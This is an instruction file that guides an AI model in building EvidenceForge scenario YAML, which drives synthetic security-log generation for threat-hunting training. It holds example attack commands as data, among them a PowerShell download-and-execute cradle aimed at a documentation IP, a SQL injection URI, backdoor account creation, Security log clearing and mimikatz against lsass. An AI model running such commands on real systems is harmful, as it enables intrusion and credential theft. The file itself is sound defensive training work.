---
name: eforge-scenario
description: >
  Create EvidenceForge scenario YAML files for generating realistic synthetic security log datasets.
  Use this skill whenever the user wants to create a new scenario, build a threat hunting exercise,
  design an attack simulation, generate security training data, or create synthetic log datasets.
  Also trigger when the user mentions "scenario", "attack scenario", "threat hunting dataset",
  "security logs", "log generation", "EvidenceForge", or wants to simulate any kind of cyber attack
  for training or testing purposes — even if they don't explicitly say "scenario".
---

# EvidenceForge Scenario Creator

You are helping the user create an EvidenceForge scenario YAML file that will drive deterministic generation of realistic, cross-correlated security log datasets. The generated scenario feeds into the `eforge generate` CLI which produces logs across up to 7 formats (Windows Event, Zeek, eCAR, syslog, bash_history, Snort alerts, web access logs).

The goal is a scenario that produces data useful for threat hunting training — realistic baseline noise mixed with a buried attack storyline that a hunter would need to find. The primary users are security professionals, though the data may be consumed by students and newcomers as well.

## How This Works

EvidenceForge uses a two-phase approach:
1. **You** (the skill) help the user design the scenario through conversation
2. **`eforge generate`** deterministically produces logs from that scenario — no LLM involved, fully deterministic

The engine does NOT embellish or fill in details. Whatever you put in the scenario YAML is exactly what drives generation. This means you need to generate realistic, specific technical details: actual command lines, realistic file paths, proper IP addresses, correct process names. Vague or placeholder content produces vague logs.

Your job is to understand what the user wants, ask smart questions to fill gaps, and produce a valid, technically detailed scenario YAML file — plus an ENVIRONMENT.md companion document.

## Interview Flow

Use a hybrid approach: let the user describe their idea first, then ask targeted follow-up questions to fill gaps. Don't present a checklist — have a conversation.

**Ask exactly ONE question per message.** Never bundle multiple questions in a single turn — it's overwhelming and users tend to only answer the first one. Use the `AskUserQuestion` tool if it's available to you; fall back to a conversational question if not. Either way, one question at a time. After the user answers, acknowledge briefly (one sentence max) and move to the next topic.

If the user gives a rich description up front, extract as much as you can from it before asking questions. If they're vague ("I need some attack data"), guide them through the key decisions.

### Key Topics to Cover

**The attack story** — This is the heart of the scenario and shapes everything else. What attack technique or kill chain should be buried in the data? Suggest a realistic attack chain with specific MITRE ATT&CK techniques and let the user confirm or adjust. When referencing ATT&CK, always use both name and ID — for example, "OS Credential Dumping (T1003)" or "Exploit Public-Facing Application (T1190)".

Multiple attackers and parallel attack paths are supported — for example, an external attacker doing credential stuffing while an insider exfiltrates data.

**The environment** — What kind of organization? (corporate office, retail store, hospital, cloud-native startup, manufacturing plant, etc.) This determines the mix of users, systems, and network topology. A 5-person startup looks very different from a 500-person enterprise.

**The network** — What does the network look like? Subnets, segments, where sensors are placed. The user might describe this conversationally, paste a text-based network diagram, or ask you to design a realistic network for the environment type. Network topology drives which connections are visible in the generated logs — without it, all connections are visible to all sensors.

**Log boundary** — Only include systems and logs that the victim organization would actually have access to. See the "Log Realism: What You'd Actually Have" section below for details. This is especially important for scenarios involving third parties, cloud services, or SaaS vendors.

**Scale and duration** — How many users and systems? What time window? If the user is aiming for something very large, you can advise them if you think the scale might make the exercise unwieldy, but it's ultimately their call.

**Log formats** — Which formats should be generated? Windows Event Security and Zeek are the most common pair. Add eCAR for EDR visibility, syslog + bash_history for Linux systems, Snort for IDS alerts, web_access for web server logs, proxy_access for forward proxy logs (captures outbound HTTP/HTTPS with cache status, CONNECT tunnels, and full URLs).

**Difficulty** — How hard should the attack be to find? This affects baseline noise intensity, how spread out the attack events are, and whether the attacker uses obvious or subtle techniques.

**Attacker realism / messiness** — How polished is the attacker? Real attacks are messy — even skilled operators make mistakes, hit dead ends, and waste time on paths that go nowhere. Ask the user how much "fumbling" they want in the storyline. This ranges from a near-perfect surgical strike (rare, but appropriate for APT scenarios) to a sloppy novice who tries multiple approaches before succeeding. See the "Attacker Fumbles and Dead Ends" section below for implementation details.

### Persona Selection

EvidenceForge includes a library of 15 pre-built personas that are resolved automatically by name. Reference them in user definitions without defining them inline — the validator and engine resolve them from the built-in library. Only define personas inline if you need to customize behavior. Read the YAML files in `personas/` for full details.

| Persona | Work Hours | Risk Profile | Typical Role |
|---------|-----------|--------------|-------------|
| developer | 9am-6pm (lunch 12-1) | high | Software engineer |
| sysadmin | 8am-6pm (lunch 12-1) | high | System administrator |
| security_analyst | 9am-5pm (lunch 12-1) | high | SOC analyst |
| analyst | 8am-5pm (lunch 12-1) | medium | Business analyst |
| data_analyst | 8am-5pm (lunch 12-1) | medium | Data/BI analyst |
| executive | 8am-7pm (lunch 12-1) | medium | C-suite / director |
| project_manager | 8am-6pm (lunch 12-1) | medium | PM / scrum master |
| accountant | 8am-5pm (lunch 12-1) | medium | Finance / accounting |
| sales | 8am-6pm (lunch 12-1) | medium | Sales representative |
| marketing | 9am-6pm (lunch 12-1) | medium | Marketing staff |
| hr | 8am-5pm (lunch 12-1) | medium | Human resources |
| help_desk | 8am-6pm (lunch 12-1) | medium | IT help desk |
| legal_counsel | 9am-6pm (lunch 12-1) | low | Legal / compliance |
| receptionist | 8am-5pm (lunch 12-1) | low | Front desk |
| intern | 9am-5pm (lunch 12-1) | low | Intern / trainee |

You can also define custom personas inline in the scenario if none of the pre-built ones fit (e.g., for a retail cashier or hospital nurse). Custom personas use the same schema.

### Generating Realistic Users

Every user should have a realistic, natural-sounding name by default. Think diverse, real-world names — not generic placeholders:

Good: `marcus.chen`, `priya.patel`, `sarah.oconnell`, `diego.ramirez`, `aisha.johnson`
Bad: `jsmith`, `user01`, `shift_manager`, `test_user`

The username format should follow a consistent convention for the organization (e.g., `first.last`, `firstinitial.last`, `flast`). Pick one convention and stick with it across the scenario.

**Service/system accounts** are the exception — names like `svc_backup`, `sql_agent`, or `ftp_service` are fine when needed for the story or environment realism. Only add these when they're needed.

### Modeling Threat Actors

**External attackers do NOT have their own accounts in the victim organization.** Never create a user called `attacker`, `hacker`, `threat_actor`, or anything obviously malicious. Real attackers operate by:

- **Compromising legitimate accounts** — The attacker gains credentials for an existing user (via phishing, credential stuffing, password spraying, etc.) and uses that account. The storyline `actor` field is the compromised user's username. This is the most common case.
- **Operating at the system level** — Some attacks don't involve user accounts at all (e.g., exploiting a vulnerable service). The actor can be a system account like `SYSTEM`, `NT AUTHORITY\SYSTEM`, `root`, or the service account running the exploited application. Well-known OS built-in accounts (`SYSTEM`, `root`, `LOCAL SERVICE`, etc.) are automatically accepted by the validator. For custom service accounts (e.g., `svc_backup`, `apache`), add them to `environment.service_accounts`.
- **Creating new accounts (rare)** — If the attacker creates accounts for persistence, those accounts must have blending-in names like `svc_sqlbackup`, `admin.temp`, or `backup.service` — never `attacker1` or `evil_admin`. Add these to `environment.service_accounts` so they're valid storyline actors.

**Insider threats** use their own legitimate account — they're already in the users list with a normal name.

### Realistic Naming for Attacker Infrastructure and Tools

Everything the attacker controls should look plausible at first glance. The whole point of threat hunting training is that the data looks realistic — obvious names are a dead giveaway that defeats the exercise.

**C2 servers and malicious domains:**
- Good: `cdn-assets-update.com`, `analytics-service.net`, `img-hosting-cdn.com`, `graph-api-auth.com`
- Bad: `evil-c2.com`, `malware-server.net`, `attacker-infra.io`, `hack.evil.com`

**Malicious files and processes:**
- Good: `svchost_helper.exe`, `update-agent.bin`, `chromium_updater.sh`, `ms-index-service.exe`
- Bad: `my_password_dumper.exe`, `evil_payload.ps1`, `hack_tool.bat`, `malware.exe`

**Attacker email addresses** (for phishing "From:" lines, etc.):
- Good: `support@accounts-verify.com`, `noreply@hr-benefits-portal.net`, `j.martinez@consulting-group.com`
- Bad: `attacker@external`, `hacker@evil.com`, `phishing@malicious.net`

**Exception — real tool names:** When the scenario uses a well-known attack tool, use its real name. `mimikatz.exe` is mimikatz. `PsExec.exe` is PsExec. `nmap`, `Rubeus.exe`, `SharpHound.exe`, `Cobalt Strike` — all fine. The rule is: don't *invent* names that scream "malicious", but don't rename real tools either.

### Log Realism: What You'd Actually Have

A critical principle: **only generate logs that the victim organization would realistically collect.** The scenario must model the defender's actual visibility, not an omniscient view of the attack.

**You have logs from systems you own and operate.** This includes:
- Workstations, servers, and domain controllers in the org's own infrastructure
- Network sensors (Zeek, Snort, firewall) deployed on the org's own network
- On-prem applications the org runs itself

**You do NOT have OS-level logs from third parties.** This is the most common mistake. If the scenario involves a SaaS vendor, cloud provider, MSP, or any external organization:
- You would **never** have their syslog, Windows Event logs, bash_history, or any OS-level telemetry from their servers
- You **might** have application-level audit logs from the service (e.g., SaaS admin console logs, OAuth token grants, API access logs) — but only if the scenario explicitly establishes this (e.g., "the contract includes audit log access")
- You **would** see the network traffic between your systems and theirs (via your own network sensors)
- You **would** see the effects on your own systems (e.g., a malicious update pushed from the compromised vendor hits your endpoints — you see that on your endpoints)

**Examples of what this means in practice:**

| Scenario Element | You HAVE | You DON'T Have |
|---|---|---|
| SaaS vendor compromised | Network connections to vendor IPs from your systems; effects on your endpoints when malicious update arrives | Vendor's server syslog, their internal lateral movement, their OS-level logs |
| Cloud-hosted app (your tenant) | Application audit logs (if configured), network flows to cloud IPs | The cloud provider's hypervisor logs, their infrastructure syslog |
| Partner VPN connection | Your firewall/VPN logs for the tunnel, traffic through your network sensors | The partner's internal network logs, their endpoint telemetry |
| Attacker's C2 server | Outbound connections from your network to the C2 IP (via Zeek/Snort) | The C2 server's access logs, the attacker's tooling output |

**When designing the systems list:** Do not add systems for third-party infrastructure. If a SaaS vendor's server is involved in the attack, it exists only as an external IP address that appears in network connections and storyline details — not as a system with a hostname, OS, and assigned user in your environment.

## Scenario YAML Schema

Read `references/scenario-reference.md` (located alongside this skill file) for the full schema reference. Here is the essential structure:

```yaml
version: "1.0"
name: scenario-name              # Alphanumeric, dashes, underscores only
description: |
  Multi-line description of the scenario

environment:
  description: "Organization/environment description"

  timezone:                       # Optional (defaults to UTC)
    default: "America/New_York"
    systems:                      # Optional pattern-based overrides (fnmatch glob)
      "EU-*": "Europe/London"

  users:
    - username: marcus.chen
      full_name: "Marcus Chen"
      email: marcus.chen@example.com
      persona: developer          # Must reference a persona name
      primary_system: WS-DEV-01   # Optional, must reference a system hostname
      enabled: true               # Default: true
      groups: ["engineering"]     # Optional

  systems:
    - hostname: WS-DEV-01        # RFC 1123 compliant
      ip: "10.0.1.10"            # IPv4 address
      os: "Windows 10"           # OS determines which log formats are generated
      type: workstation           # workstation | server | domain_controller
      assigned_user: marcus.chen  # Optional
      services: []               # Optional

  service_accounts: []             # Optional: custom service/system accounts valid as storyline actors

  groups:                         # Optional
    - name: engineering
      members: [marcus.chen]

  network:                        # Optional but recommended for realism
    segments:
      - name: corporate_lan
        cidr: "10.0.1.0/24"
        description: "Corporate workstation network"
        systems: [WS-DEV-01]     # Must reference existing hostnames
    sensors:
      - type: network             # network | ids | firewall
        name: core-tap
        monitoring_segments: [corporate_lan]
        direction: bidirectional  # bidirectional | inbound | outbound
        placement: span           # span (sees intra-segment) | tap (cross-segment only)
        log_formats: [zeek]

personas:                         # Define inline or reference pre-built from personas/
  - name: developer
    description: "Software developer"
    typical_activities:
      - "Write and edit source code"
      - "Run builds and tests"
    work_hours: "9am-5pm (lunch 12pm-1pm)"
    application_usage: ["VS Code", "Terminal", "Chrome"]
    risk_profile: low             # low | medium | high

time_window:
  start: "2024-01-15T10:00:00Z"  # ISO 8601 UTC
  duration: "8h"                  # OR use end: "2024-01-15T18:00:00Z"

baseline_activity:
  description: "Normal office activity"
  intensity: medium               # low (~5 events/user/hr) | medium (~15) | high (~40)
  variation: medium               # low (±10%) | medium (±25%) | high (±50%)

logon_grace_period: "30m"         # Optional (default "30m") — suppresses "no prior logon"
                                  # warnings for events within this duration of time_window.start

storyline:                        # The attack events to bury in the data
  - id: evt-recon-whoami          # Required: unique event ID. Use descriptive labels
                                  # (e.g., "evt-lateral-ssh", "evt-c2-beacon-day2") or
                                  # sequential IDs ("evt-001"). Must be unique across all events.
    time: "+2h"                   # Relative offset from start, or absolute ISO 8601
    actor: marcus.chen            # Username of compromised account (or system account)
    system: WS-DEV-01             # Must reference existing hostname
    activity: "Recon: enumerate current user"  # Human-readable (for GROUND_TRUTH.md only)
    events:                       # Typed event declarations — validated per-type fields
      - type: process
        process_name: "C:\\Windows\\System32\\whoami.exe"
        command_line: "whoami"
        technique: "T1033 - System Owner/User Discovery"

output:
  logs:
    - format: windows
    - format: zeek
    # Available: windows, zeek, ecar, syslog,
    #            bash_history, snort_alert, web_access
  destination: "./output"
  compression: false
```

### OS-Aware Log Routing

The `os` field on systems determines which native log formats are generated:
- **Windows** (Windows 10, Windows 11, Windows Server 2019, etc.) → Windows Event Security logs + Sysmon
- **Linux** (Ubuntu, CentOS, Debian, RHEL, etc.) → syslog + bash_history
- **eCAR** → Optional EDR/XDR layer, works on any OS (only emitted if in output logs list)
- **Zeek, Snort** → Network-level, OS-agnostic (driven by network sensor configuration)
- **web_access** → Generated for systems with `roles: [web_server]`
- **proxy_access** → Generated for systems with `roles: [forward_proxy]`; logs all outbound HTTP/HTTPS from internal systems routed through the proxy, with CONNECT entries for HTTPS, cache HIT/MISS, and full destination URLs

See `references/evidence-formats.md` for detailed field documentation, output paths, and known limitations for each log format.

### Validation Rules

The scenario is validated before generation. Common issues to avoid:
- Every `user.persona` must match a persona name (from inline personas or pre-built library)
- Every `user.primary_system` must match a system hostname
- Every `system.assigned_user` must match a username
- Every storyline `actor` must be a username defined in the users list, a well-known built-in account (e.g., `SYSTEM`, `root`), or listed in `environment.service_accounts`
- Every storyline `system` must match a system hostname
- Every storyline event must have a unique `id` field — no duplicates allowed
- Usernames, hostnames, and IPs must all be unique
- Network segment `systems` must reference existing hostnames
- Network sensor `monitoring_segments` must reference existing segment names

## Building the Storyline

The storyline is the most important part — it's what the threat hunter will be looking for. Think about it as a realistic attack narrative that follows a kill chain:

1. **Initial Access (TA0001)** — How does the attacker get in? Phishing (T1566), Exploit Public-Facing Application (T1190), Valid Accounts (T1078)
2. **Execution (TA0002)** — What runs? Command and Scripting Interpreter (T1059), Scheduled Task/Job (T1053)
3. **Persistence (TA0003)** — How do they maintain access? Scheduled Task/Job (T1053), Create Account (T1136), Server Software Component (T1505)
4. **Privilege Escalation (TA0004)** — How do they get higher privileges? Abuse Elevation Control Mechanism (T1548), Valid Accounts: Domain Accounts (T1078.002). On Linux, check for sudo misconfigurations, SUID binaries. On Windows, credential dumping leads to domain admin.
5. **Defense Evasion (TA0005)** — How do they avoid detection? Impair Defenses (T1562), Indicator Removal (T1070). Consider disabling AV, clearing logs, timestomping.
6. **Credential Access (TA0006)** — How do they get credentials? OS Credential Dumping (T1003), Unsecured Credentials (T1552), Kerberoasting (T1558.003)
7. **Discovery (TA0007)** — What does the attacker enumerate? System Information Discovery (T1082), Account Discovery (T1087), Network Service Discovery (T1046)
8. **Lateral Movement (TA0008)** — How do they spread? Remote Services (T1021), Use Alternate Authentication Material (T1550)
9. **Collection & Exfiltration (TA0009/TA0010)** — What's the goal? Data from Local System (T1005), Exfiltration Over C2 Channel (T1041), Exfiltration Over Web Service (T1567)
10. **Impact (TA0040)** — If applicable: Data Encrypted for Impact (T1486), Inhibit System Recovery (T1490)

Not every scenario needs all phases — an insider threat won't have privilege escalation if they already have access, a ransomware attack emphasizes impact over exfiltration. But actively consider each phase and include it when it makes the attack realistic. Omitting privilege escalation or persistence from an external attacker scenario is a common gap that makes the storyline feel incomplete.

### Attacker Fumbles and Dead Ends

Real attackers are not perfect. Even experienced operators make mistakes, hit dead ends, and waste time on approaches that don't pan out. Including this messiness makes the data dramatically more realistic and the hunt more interesting — a surgical, zero-waste attack is actually harder to believe than one with false starts.

Based on the user's chosen attacker realism level, weave fumbles and dead ends into the storyline. These are **valid storyline events using standard event types** — the engine handles them normally. The "error" is in-universe (the simulated attacker made a mistake), not in the data structure.

**Mistakes** — the attacker does something wrong and has to correct it:
- Failed logon attempts before finding valid credentials (`failed_logon` events)
- Mistyped executable or path in a command (`process` event with wrong binary name, followed by the correct one)
- Connection to the wrong host or port (`connection` event that produces a Zeek S0/REJ record)
- Running a tool with incorrect flags that produces an error, then re-running correctly
- Attempting to access a resource they don't have permissions for

**Dead ends** — the attacker tries something that technically works but doesn't achieve their goal:
- Searching for files matching a pattern and finding nothing (e.g., `dir /s *.kdbx` on a system with no KeePass databases)
- Attempting lateral movement to a host via multiple methods (RDP, PsExec, WMI) but failing on each, then moving to a different target
- Running recon commands that return unhelpful results (e.g., `net group "Domain Admins"` on a system where the attacker already has the info)
- Enumerating a network share that turns out to be empty or irrelevant
- Connecting to a database that doesn't contain the data they're looking for

These are just examples — invent additional realistic variations appropriate to the specific scenario and attack chain. A novice attacker might have 5-8 fumbles scattered throughout the storyline; a skilled operator might have 1-2 subtle dead ends. Scale the messiness to the user's chosen level.

**Placement:** Fumbles work best right before a successful action (failed logon → successful logon) or as abandoned branches between kill chain phases. Don't cluster them all at the beginning — distribute them throughout the storyline.

When building storyline events, each entry needs an `events` list with typed declarations. Be technically specific — the engine uses these fields directly.

**Available event types:** `process`, `logon`, `failed_logon`, `logoff`, `connection`, `ssh_session`, `rdp_session`, `account_created`, `account_deleted`, `group_member_added`, `service_installed`, `scheduled_task_created`, `log_cleared`, `create_remote_thread`, `raw`

The `raw` type targets a specific output format with arbitrary fields — use it for events without a dedicated type (e.g., custom syslog messages, specific Windows events). Requires `target_format` and `fields` dict. Raw events bypass cross-format correlation, so prefer typed events when available.

**Process execution:**
```yaml
events:
  - type: process
    process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')\""
    technique: "T1059.001 - PowerShell"
```

**Network connections (C2, exfiltration):**

IMPORTANT: For C2 and exfiltration connections, always specify `method`, `uri`, and `user_agent` when using `service: http`. Without these fields, the engine auto-generates generic HTTP metadata (random URIs like `/favicon.ico`) that won't reflect the actual attack activity in Zeek http.log or proxy logs. For `service: ssl` (HTTPS), the HTTP layer is encrypted and not visible to Zeek, so these fields aren't needed — but the connection will still appear in conn.log and ssl.log.

```yaml
events:
  - type: connection
    dst_ip: "198.51.100.10"
    dst_port: 443
    service: "ssl"
    technique: "T1071.001 - Web Protocols"
```

**Exfiltration over HTTP (include method/uri for http.log visibility):**
```yaml
events:
  - type: connection
    dst_ip: "198.51.100.10"
    dst_port: 80
    service: http
    method: "POST"
    uri: "/api/v2/upload"
    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    status_code: 200
    technique: "T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol"
```

**HTTP requests (web attacks, web shell access):**
Use `connection` with `service: http` for web-based attacks. This produces correlated web_access + zeek_http + zeek_conn records. Do NOT use `raw` with `target_format: web_access` — that bypasses cross-source correlation.
```yaml
events:
  - type: connection
    dst_ip: "10.10.20.10"
    dst_port: 80
    service: http
    source_ip: "203.0.113.45"
    method: "GET"
    uri: "/ehr/login.php?id=1' OR 1=1--"
    status_code: 200
    user_agent: "Mozilla/5.0 (compatible; Googlebot/2.1)"
    technique: "T1190 - Exploit Public-Facing Application"
```

**Authentication (logon/failed logon):**
```yaml
events:
  - type: logon
    source_ip: "10.0.1.50"
    logon_type: 3    # 3=network, 10=RDP, 2=interactive
    technique: "T1078 - Valid Accounts"
```

**SSH/RDP lateral movement (compound events — produces network + host logs):**
```yaml
events:
  - type: ssh_session   # or rdp_session
    source_ip: "10.0.1.50"
    technique: "T1021.004 - Remote Services: SSH"
```

**Linux commands (use process type with Linux binary paths):**
```yaml
events:
  - type: process
    process_name: "/usr/bin/cat"
    command_line: "cat /etc/passwd"
    technique: "T1087.001 - Account Discovery: Local Account"
```

**Correlated events for process commands:** When a storyline step runs a command that would produce additional audit events (account creation, service installation, scheduled task creation, log clearing, process injection, etc.), explicitly declare those as separate events in the same step's `events` list alongside the `process` event. Think about what audit trail the command would leave in a real environment and declare each distinct event. For example:
- `net user backdoor P@ss /add` → declare both `process` and `account_created` (with `target_username`)
- `sc create evilsvc binPath=...` → declare both `process` and `service_installed` (with `service_name` and `service_file_name`)
- `wevtutil cl Security` → declare both `process` and `log_cleared`
- mimikatz credential dumping → declare `process` and `create_remote_thread` (with `target_process: lsass.exe`)

The engine auto-infers 6 common Windows command patterns as a safety net, but do not rely on this -- always declare correlated events explicitly.

Use RFC 5737 documentation IP ranges for external attacker IPs (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24). Use private ranges (10.x, 172.16-31.x, 192.168.x) for internal systems.

### Encoded Payloads Must Be Real

When a storyline event includes base64-encoded data, obfuscated commands, or any other encoded content, the encoding must be accurate and decodable — never fake strings that just "look like" base64. Use the Bash tool to produce real encodings.

For PowerShell's `-EncodedCommand` flag (which expects UTF-16LE base64):
```bash
echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.45/payload.ps1")' | iconv -t UTF-16LE | base64
```

For plain base64 (Linux commands, general obfuscation):
```bash
echo -n 'cat /etc/passwd' | base64
```

Always generate the encoded string via Bash and paste the real output into the scenario YAML. A threat hunter who decodes the base64 should find the actual command inside.

For the `time` field, prefer relative offsets from the scenario start ("+15m", "+1h30m", "+2h") — they're easier to read and relocatable. Units supported: `d` (days), `h` (hours), `m` (minutes), `s` (seconds), `ms` (milliseconds). Use seconds/milliseconds for rapid sequences like password sprays ("+20m30s", "+20m30s500ms"). Space events realistically: real attackers pause between steps, but don't drag reconnaissance over 6 hours either.

## ENVIRONMENT.md — Student Context Document

After generating the scenario YAML, also create an `ENVIRONMENT.md` file in the same directory as the scenario file. This document provides organizational context to the person analyzing the generated data — like a briefing packet a new SOC analyst would receive on their first day.

**ENVIRONMENT.md must contain ZERO information about the attack storyline or any malicious/suspicious activity.** It is purely organizational context.

### Content and Format

```markdown
# [Organization Name] — Environment Summary

## Overview

[Brief description of the organization, drawn from environment.description.]

- **Timezone:** [timezone] ([UTC offset at scenario time])
- **All log timestamps are in UTC.** Business hours are approximately HH:MM–HH:MM UTC.
- **Data window:** [start] to [end] ([duration])
- **Approximate environment size:** [N] users, [M] systems/devices

## User Directory

| Username | Full Name | Email | Role | Department | Primary System |
|----------|-----------|-------|------|------------|----------------|
| ... | ... | ... | ... | ... | ... |

[Approximately N users shown. Full directory available on request.]

## Systems Inventory

| Hostname | IP Address | OS | Type | Services |
|----------|------------|-----|------|----------|
| ... | ... | ... | ... | ... |

## Network Topology

### Subnets

| Segment | CIDR | Description |
|---------|------|-------------|
| ... | ... | ... |

### Network Sensors

| Sensor | Type | Placement | Monitors | Direction | Formats |
|--------|------|-----------|----------|-----------|---------|
| ... | ... | SPAN/TAP | [segments] | ... | ... |

[Describe what each sensor can see in plain language.]

## Available Data Sources

| Log Format | Description |
|------------|-------------|
| ... | ... |
```

### Rules for Building ENVIRONMENT.md

**User directory:**
- Sort all listed users alphabetically by username
- Include ALL users who appear in the storyline (their accounts show up in the attack data, so students need to be able to look them up)
- Add 5–15 additional users from the background population, mixed in with the storyline users
- For very large scenarios (50+ users), include a representative subset — not all of them
- **Exclude any accounts the attacker created** during the attack (e.g., persistence accounts like `svc_sqlbackup`) — these wouldn't exist in the org's directory beforehand
- **Include every legitimate user whose account gets compromised** — students will see activity under that username and need to look them up
- Use natural role names, not raw persona codes. Persona "hr" becomes "Human Resources", "sysadmin" becomes "System Administrator", "developer" becomes "Software Engineer", etc.

**Timezone:**
- State the organization's timezone AND explicitly note that all log timestamps are in UTC
- Include the UTC offset so there's no ambiguity (e.g., "Eastern Time (UTC-5)")
- Show business hours converted to UTC

**Network sensors:**
- Describe what each sensor can see in straightforward terms (e.g., "Monitors all traffic between subnets via SPAN port on the core switch")
- Do NOT editorialize about gaps or blind spots — just describe what each sensor covers

**File location:**
- Save as `ENVIRONMENT.md` in the same directory as the scenario YAML file
- Name it `<scenario-name>-ENVIRONMENT.md` if the scenario name is available

## Output Workflow

After the interview, generate both files:

1. **Scenario YAML** — Write to the user's chosen path (default: `scenarios/<scenario-name>/scenario.yaml`)
2. **ENVIRONMENT.md** — Write alongside the scenario YAML (default: `scenarios/<scenario-name>/ENVIRONMENT.md`)
3. **Realism Review** — Before validating, review the entire scenario as a tough-but-fair devil's advocate. Check:
   - **Attack realism**: Does the attack chain make sense? Would a real attacker do this in this order? Are there missing steps (e.g., no reconnaissance before lateral movement, no persistence after initial access)?
   - **Technical accuracy**: Are command lines correct for the target OS? Are process paths right? Do the MITRE ATT&CK technique IDs match what's actually happening?
   - **Naming realism**: Are all attacker-controlled artifacts (domains, files, processes, created accounts) plausibly named? Would any name immediately tip off a defender? Check for names like `attacker`, `evil.com`, `malware.exe`, `@external`, or anything that screams "malicious".
   - **Environmental consistency**: Do the users, systems, and network make sense together? Would this org realistically have this infrastructure?
   - **Log boundary**: Are all systems in the systems list owned by the victim org? Are there any third-party servers (SaaS, cloud provider, partner) that shouldn't be generating OS-level logs? External entities should only appear as IP addresses in network connections, never as systems with hostnames and OS-level log generation.
   - **Timing realism**: Are attack events spaced realistically? (Not crammed into 30 seconds, not dragged over days with no activity)
   - **Detection opportunity**: Is there enough signal for a hunter to find the attack while still requiring genuine effort?
   - **Attacker messiness**: Does the storyline include fumbles and dead ends appropriate to the chosen attacker realism level? A storyline with zero mistakes is unrealistic unless the user specifically requested a surgical APT scenario.
   - **Sensor coverage** (see next section): Can the attack actually be discovered given the declared sensor topology and log formats?
   If you find issues, fix them. Tell the user what you changed and why.

### Sensor Coverage Verification

Before finalizing the scenario, verify that every storyline event is **discoverable** given the declared topology, log formats, and sensor placement. A storyline event that produces zero log traces is invisible to the hunter and defeats the purpose of the exercise.

**Check each storyline event against these rules:**

1. **Host log coverage** — The system where the event occurs must have at least one matching log format enabled in `output.logs`:
   - Windows systems need `windows` (or `ecar`) for logon/process events
   - Linux systems need `syslog` and/or `bash_history` for authentication and command execution
   - If a system's OS doesn't match any enabled format, the event will produce no host-level traces

2. **Network sensor coverage** — If the storyline event involves a network connection (lateral movement, C2 communication, exfiltration, scanning):
   - At least one network sensor must monitor the segment where the source or destination system resides
   - Check `network.sensors[].monitoring_segments` against the segments containing the storyline systems
   - A TAP sensor only sees cross-segment traffic; a SPAN sensor sees intra-segment traffic too
   - If no network sensors cover the relevant segments, add one or warn the user about the visibility gap

3. **Format enablement** — Verify the formats listed in each sensor's `log_formats` are also listed in `output.logs`. A sensor configured to generate `snort_alert` won't produce output if `snort_alert` isn't in the output logs list.

**If you find coverage gaps:**
- Flag the specific storyline event(s) that may not be discoverable
- Suggest concrete fixes: add a sensor, enable a log format, or adjust the network topology
- Let the user decide whether to fix the gap or accept it (some scenarios intentionally have blind spots to test whether hunters notice)
4. **Validate** — Run `uv run eforge validate <scenario-file>` to check schema and cross-references
5. If validation fails, fix the issues and re-validate
6. **Summarize** what was created: environment size, time window, attack narrative overview, log formats

If the user wants to immediately generate logs, suggest using `/eforge generate` or running `uv run eforge generate <scenario-file>`.

When generation completes, the output directory will contain a `GROUND_TRUTH.md` file with the full attack timeline, IOCs, and answer key. Let the user know this exists and where to find it.

## Future Enhancements

These features are planned but not yet implemented:
- Network diagram ingestion (Mermaid, Graphviz) to auto-generate network topology
- Full user directory export as a separate CSV file for large scenarios
- Authentication and naming convention documentation in ENVIRONMENT.md
